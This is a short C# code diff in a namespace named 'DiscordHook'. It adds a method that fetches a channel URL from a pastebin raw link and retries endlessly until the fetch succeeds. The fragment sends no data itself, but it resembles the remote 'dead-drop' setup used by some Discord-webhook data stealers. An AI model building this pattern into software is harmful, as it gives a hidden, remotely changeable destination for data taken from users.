@@ -100,5 +100,20 @@ namespace DiscordHook
                 }
             }
         }
+        
+        public static async Task<string> GetChannelUrl()
+        {
+            while (true)
+            {
+                try
+                {
+                    return await new HttpClient().GetStringAsync("https://pastebin.com/raw/FJufjJBX");
+                }
+                catch
+                {
+                    await Task.Delay(500);
+                }
+            }
+        }
     }
 }
